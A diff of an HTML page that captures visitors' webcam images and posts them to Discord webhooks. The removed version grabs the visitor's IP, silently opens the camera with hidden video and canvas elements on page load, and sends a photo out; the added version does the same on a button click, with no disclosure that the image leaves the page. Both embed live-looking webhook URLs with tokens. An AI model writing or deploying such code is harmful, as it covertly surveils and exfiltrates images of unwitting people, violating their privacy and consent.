@@ -1,71 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>User IP Capture</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Auto Photo Capture</title>
     <script>
-        $(document).ready(function() {
-            // Function to capture user IP
-            function captureIP() {
-                $.getJSON("https://api.ipify.org?format=json", function(data) {
-                    var userIP = data.ip;
-                    console.log("User IP: " + userIP);
-                    // Function to take photo
-                    function takePhoto() {
-                        var video = document.getElementById('video');
-                        var canvas = document.getElementById('canvas');
-                        var context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        var photo = canvas.toDataURL('image/png');
-                        console.log("Photo taken: " + photo);
-                        // Function to send photo to Discord using webhooks
-                        function sendToDiscord(photo) {
-                            var webhookURL = "https://discord.com/api/webhooks/1187491873175109713/4kcz2pbN8UAEAn7Ux2aYNu1x9AcW4xrDF_B52_DROKXPiVjvp_HSgVK86tYhWib0y9Mh";
-                            $.ajax({
-                                type: "POST",
-                                url: webhookURL,
-                                data: JSON.stringify({
-                                    "content": "New user photo",
-                                    "embeds": [{
-                                        "image": {
-                                            "url": photo
-                                        }
-                                    }]
-                                }),
-                                contentType: "application/json",
-                                success: function() {
-                                    console.log("Photo sent to Discord");
-                                },
-                                error: function() {
-                                    console.log("Failed to send photo to Discord");
-                                }
-                            });
-                        }
-                        sendToDiscord(photo);
-                    }
-                    // Check if getUserMedia is supported
-                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                        navigator.mediaDevices.getUserMedia({ video: true })
-                            .then(function(stream) {
-                                var video = document.getElementById('video');
-                                video.srcObject = stream;
-                                video.play();
-                                takePhoto();
-                            })
-                            .catch(function(error) {
-                                console.log("Failed to access camera: " + error);
-                            });
-                    } else {
-                        console.log("getUserMedia is not supported");
-                    }
+        function capturePhoto() {
+            var video = document.getElementById('video');
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+            
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.play();
+                })
+                .catch(function(error) {
+                    console.log('Error accessing camera: ', error);
                 });
-            }
-            captureIP();
-        });
+            
+            video.addEventListener('canplay', function() {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                var image = canvas.toDataURL('image/png');
+                sendToDiscord(image);
+            });
+        }
+        
+        function sendToDiscord(image) {
+            var webhookUrl = 'https://discord.com/api/webhooks/1187496675716104304/ZmCpK-ZLhY9sUloPNC-8bkmxyd2b3De52_oevo5cufS-kjts_eyvg5rKPo2qA8CzEmyZ';
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: 'New user photo',
+                    embeds: [{
+                        image: {
+                            url: image
+                        }
+                    }]
+                })
+            })
+            .then(function(response) {
+                console.log('Photo sent to Discord');
+            })
+            .catch(function(error) {
+                console.log('Error sending photo to Discord: ', error);
+            });
+        }
     </script>
 </head>
 <body>
-    <video id="video" style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <h1>Auto Photo Capture</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <button onclick="capturePhoto()">Capture Photo</button>
 </body>
 </html>
+
